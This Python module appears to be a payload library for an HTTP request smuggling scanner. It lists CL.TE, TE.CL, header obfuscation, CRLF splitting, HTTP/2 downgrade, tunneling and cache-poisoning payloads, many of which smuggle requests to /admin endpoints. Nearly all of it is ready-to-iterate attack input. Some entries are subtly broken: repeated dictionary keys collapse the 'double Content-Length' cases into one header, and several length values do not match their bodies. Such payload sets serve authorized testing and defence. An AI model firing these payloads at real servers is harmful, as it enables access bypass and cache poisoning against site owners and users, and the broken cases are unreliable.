"""
HTTP Request Smuggling Payloads

Payloads for HTTP request smuggling attacks including:
- CL.TE attacks
- TE.CL attacks
- Double Content-Length
- Obfuscated headers
- CRLF injection
"""

# CL.TE (Content-Length, Transfer-Encoding) smuggling
CL_TE_PAYLOADS = [
    {
        "name": "basic_cl_te",
        "method": "POST",
        "headers": {
            "Content-Length": "50",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\n",
        "description": "Basic CL.TE smuggling",
    },
    {
        "name": "cl_te_with_request",
        "method": "POST",
        "headers": {
            "Content-Length": "60",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        "description": "CL.TE with smuggled GET /admin",
    },
    {
        "name": "cl_te_multi",
        "method": "POST",
        "headers": {
            "Content-Length": "70",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nPOST /admin/change_password HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "description": "CL.TE with smuggled POST to admin",
    },
    {
        "name": "cl_te_with_content",
        "method": "POST",
        "headers": {
            "Content-Length": "100",
            "Transfer-Encoding": "chunked, chunked",
        },
        "body": "0\r\n\r\nGET /secret HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        "description": "CL.TE with duplicate TE header",
    },
]

# TE.CL (Transfer-Encoding, Content-Length) smuggling
TE_CL_PAYLOADS = [
    {
        "name": "basic_te_cl",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "10",
        },
        "body": "0000\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        "description": "Basic TE.CL smuggling",
    },
    {
        "name": "te_cl_with_request",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "15",
        },
        "body": "0000A\r\n\r\nPOST / HTTP/1.1\r\nHost: evil.com\r\n\r\n",
        "description": "TE.CL with smuggled request",
    },
    {
        "name": "te_cl_duplicate",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "20",
            "Content-Length": "20",
        },
        "body": "0000\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        "description": "TE.CL with duplicate Content-Length",
    },
]

# Double Content-Length smuggling
DOUBLE_CONTENT_LENGTH = [
    {
        "name": "double_cl_1",
        "method": "POST",
        "headers": {
            "Content-Length": "5",
            "Content-Length": "50",
        },
        "body": "hello\r\n",
        "description": "Double Content-Length (5 then 50)",
    },
    {
        "name": "double_cl_reverse",
        "method": "POST",
        "headers": {
            "Content-Length": "50",
            "Content-Length": "5",
        },
        "body": "hello\r\n",
        "description": "Double Content-Length (50 then 5)",
    },
    {
        "name": "double_cl_mixed",
        "method": "POST",
        "headers": {
            "Content-Length": "10",
            "Content-Length": "100",
            "Content-Length": "5",
        },
        "body": "test\r\n",
        "description": "Triple Content-Length",
    },
]

# Obfuscated header attacks
OBFUSCATED_HEADERS = [
    {
        "name": "space_before_cl",
        "method": "POST",
        "headers": {
            "Content-Length ": "50",  # Space before colon
        },
        "body": "test\r\n",
        "description": "Space before colon in Content-Length",
    },
    {
        "name": "tab_before_cl",
        "method": "POST",
        "headers": {
            "Content-Length\t": "50",  # Tab before colon
        },
        "body": "test\r\n",
        "description": "Tab before colon in Content-Length",
    },
    {
        "name": "duplicate_te_space",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Transfer-Encoding ": "identity",  # Space after colon
        },
        "body": "test\r\n",
        "description": "Duplicate TE with space variant",
    },
]

# CRLF-based response splitting
CRLF_RESPONSE_SPLITTING = [
    {
        "name": "basic_crlf_split",
        "method": "POST",
        "headers": {
            "X-Header": "value\r\nHTTP/1.1 200 OK\r\nContent-Length: 0\r\n\r\n",
        },
        "body": "test",
        "description": "Basic CRLF response splitting",
    },
    {
        "name": "path_crlf_injection",
        "method": "POST",
        "url": "/path%0D%0AHTTP/1.1%20200%20OK%0D%0AContent-Length:%200%0D%0A%0D%0A",
        "description": "CRLF injection in URL path",
    },
    {
        "name": "header_crlf_injection",
        "method": "POST",
        "headers": {
            "Host": "target.com\r\nEvil-Header: malicious",
        },
        "body": "test",
        "description": "CRLF injection in Host header",
    },
]

# Chunked encoding manipulation
CHUNKED_ENCODING_ATTACKS = [
    {
        "name": "chunk_size_overflow",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
        },
        "body": "FFFFFFFFFFFFFF\r\nsmuggled\r\n0\r\n",
        "description": "Large chunk size for overflow",
    },
    {
        "name": "zero_chunk_size",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\nsmuggled\r\n0\r\n",
        "description": "Zero chunk size smuggling",
    },
    {
        "name": "negative_chunk_size",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
        },
        "body": "-1\r\nsmuggled\r\n0\r\n",
        "description": "Negative chunk size",
    },
]

# HTTP/2 specific smuggling
HTTP2_SMUGGLING = [
    {
        "name": "http2_header_continuation",
        "method": "POST",
        "headers": {
            "Malformed-Header": "value\r\n",
        },
        "description": "HTTP/2 header continuation attempt",
    },
    {
        "name": "http2_pseudo_header",
        "method": "POST",
        "headers": {
            ":method": "GET",
            ":path": "/admin",
        },
        "description": "HTTP/2 pseudo-header smuggling",
    },
]

# Header name obfuscation
HEADER_OBFUSCATION = [
    {
        "name": "uppercase_cl",
        "headers": {"CONTENT-LENGTH": "50"},
        "description": "Uppercase Content-Length",
    },
    {
        "name": "mixed_case_cl",
        "headers": {"CoNtEnT-LeNgTh": "50"},
        "description": "Mixed case Content-Length",
    },
    {
        "name": "duplicate_te_cases",
        "headers": {"Transfer-Encoding": "chunked", "transfer-encoding": "chunked"},
        "description": "Case-duplicated Transfer-Encoding",
    },
]

# Success indicators for request smuggling
SMUGGLING_SUCCESS_INDICATORS = [
    "200 OK",
    "admin",
    "/admin",
    "secret",
    "forbidden",
    "unauthorized",
    "403",
    "401",
    "200",
    "302",
    "301",
]

# Request smuggling detection patterns
SMUGGLING_DETECTION_PATTERNS = [
    "two different content lengths",
    "duplicate headers",
    "malformed",
    "invalid request",
    "bad request",
]

# HTTP/2 to HTTP/1.1 downgrade smuggling (H2.CL, H2.TE)
H2_DOWNGRADE_SMUGGLING = [
    {
        "name": "h2_cl_smuggle",
        "method": "POST",
        "http2_headers": {
            ":method": "POST",
            ":path": "/",
            "content-length": "50",
        },
        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "description": "HTTP/2 to HTTP/1.1 CL smuggling",
    },
    {
        "name": "h2_te_smuggle",
        "method": "POST",
        "http2_headers": {
            ":method": "POST",
            ":path": "/",
            "transfer-encoding": "chunked",
        },
        "body": "0\r\n\r\nGET /admin HTTP/1.1\r\n\r\n",
        "description": "HTTP/2 to HTTP/1.1 TE smuggling",
    },
    {
        "name": "h2_header_injection",
        "method": "POST",
        "http2_headers": {
            ":method": "POST",
            ":path": "/",
            "foo": "bar\r\nTransfer-Encoding: chunked",
        },
        "body": "0\r\n\r\nSMUGGLED",
        "description": "HTTP/2 header CRLF injection",
    },
    {
        "name": "h2_pseudo_header_smuggle",
        "method": "POST",
        "http2_headers": {
            ":method": "GET /admin HTTP/1.1\r\nHost: evil",
            ":path": "/",
        },
        "description": "HTTP/2 pseudo-header smuggling",
    },
]

# WebSocket smuggling
WEBSOCKET_SMUGGLING = [
    {
        "name": "ws_upgrade_smuggle",
        "method": "GET",
        "headers": {
            "Upgrade": "websocket",
            "Connection": "Upgrade",
            "Sec-WebSocket-Key": "dGhlIHNhbXBsZSBub25jZQ==",
            "Sec-WebSocket-Version": "13",
        },
        "smuggled_request": "GET /admin HTTP/1.1\r\nHost: target.com\r\n\r\n",
        "description": "WebSocket upgrade smuggling",
    },
    {
        "name": "ws_tunnel_smuggle",
        "method": "GET",
        "headers": {
            "Upgrade": "websocket\r\nX-Smuggled: true",
            "Connection": "Upgrade",
        },
        "description": "WebSocket tunnel header injection",
    },
    {
        "name": "h2_ws_smuggle",
        "method": "CONNECT",
        "http2_headers": {
            ":method": "CONNECT",
            ":protocol": "websocket",
            ":path": "/chat",
        },
        "description": "HTTP/2 WebSocket smuggling",
    },
]

# Transfer-Encoding obfuscation variants
TE_OBFUSCATION = [
    {
        "name": "te_chunked_space",
        "headers": {"Transfer-Encoding": " chunked"},
        "description": "TE with leading space",
    },
    {
        "name": "te_chunked_tab",
        "headers": {"Transfer-Encoding": "\tchunked"},
        "description": "TE with leading tab",
    },
    {
        "name": "te_chunked_semicolon",
        "headers": {"Transfer-Encoding": "chunked;"},
        "description": "TE with trailing semicolon",
    },
    {
        "name": "te_chunked_param",
        "headers": {"Transfer-Encoding": "chunked; foo=bar"},
        "description": "TE with parameter",
    },
    {
        "name": "te_x_chunked",
        "headers": {"Transfer-Encoding": "x-chunked"},
        "description": "Non-standard x-chunked",
    },
    {
        "name": "te_identity_chunked",
        "headers": {"Transfer-Encoding": "identity, chunked"},
        "description": "TE with identity encoding",
    },
    {
        "name": "te_chunked_comma",
        "headers": {"Transfer-Encoding": "chunked, chunked"},
        "description": "Duplicate chunked values",
    },
    {
        "name": "te_quoted",
        "headers": {"Transfer-Encoding": '"chunked"'},
        "description": "Quoted TE value",
    },
    {
        "name": "te_newline",
        "headers": {"Transfer-Encoding": "chunked\n"},
        "description": "TE with trailing newline",
    },
    {
        "name": "te_vertical_tab",
        "headers": {"Transfer-Encoding": "chunked\x0b"},
        "description": "TE with vertical tab",
    },
]

# Request tunneling payloads
REQUEST_TUNNELING = [
    {
        "name": "tunnel_via_te",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "0",
        },
        "body": "GET http://internal-server/admin HTTP/1.1\r\nHost: internal-server\r\n\r\n",
        "description": "Request tunneling via TE/CL",
    },
    {
        "name": "tunnel_connect",
        "method": "CONNECT",
        "target": "internal-server:80",
        "description": "CONNECT method tunneling",
    },
    {
        "name": "tunnel_via_upgrade",
        "method": "GET",
        "headers": {
            "Upgrade": "h2c",
            "Connection": "Upgrade, HTTP2-Settings",
            "HTTP2-Settings": "AAMAAABkAAQAAP__",
        },
        "description": "Tunneling via HTTP/2 upgrade",
    },
]

# Timeout-based smuggling detection
TIMEOUT_DETECTION = [
    {
        "name": "timeout_cl_te",
        "method": "POST",
        "headers": {
            "Content-Length": "6",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nX",
        "expected_timeout": True,
        "description": "CL.TE timeout detection",
    },
    {
        "name": "timeout_te_cl",
        "method": "POST",
        "headers": {
            "Transfer-Encoding": "chunked",
            "Content-Length": "6",
        },
        "body": "1\r\nX\r\n",
        "expected_timeout": True,
        "description": "TE.CL timeout detection",
    },
]

# Response queue poisoning
RESPONSE_QUEUE_POISON = [
    {
        "name": "response_split",
        "method": "POST",
        "headers": {
            "Content-Length": "100",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nHTTP/1.1 200 OK\r\nContent-Type: text/html\r\nContent-Length: 25\r\n\r\n<h1>Poisoned Response</h1>",
        "description": "Response queue poisoning",
    },
    {
        "name": "cache_poison_smuggle",
        "method": "POST",
        "headers": {
            "Content-Length": "60",
            "Transfer-Encoding": "chunked",
        },
        "body": "0\r\n\r\nGET /static/cached.js HTTP/1.1\r\nHost: target.com\r\nX-Injected: evil\r\n\r\n",
        "description": "Cache poisoning via smuggling",
    },
]

# Combined payload list for easy iteration
ALL_SMUGGLING_PAYLOADS = (
    CL_TE_PAYLOADS +
    TE_CL_PAYLOADS +
    DOUBLE_CONTENT_LENGTH +
    OBFUSCATED_HEADERS +
    CRLF_RESPONSE_SPLITTING +
    CHUNKED_ENCODING_ATTACKS +
    HTTP2_SMUGGLING +
    HEADER_OBFUSCATION +
    H2_DOWNGRADE_SMUGGLING +
    WEBSOCKET_SMUGGLING +
    TE_OBFUSCATION +
    REQUEST_TUNNELING +
    TIMEOUT_DETECTION +
    RESPONSE_QUEUE_POISON
)
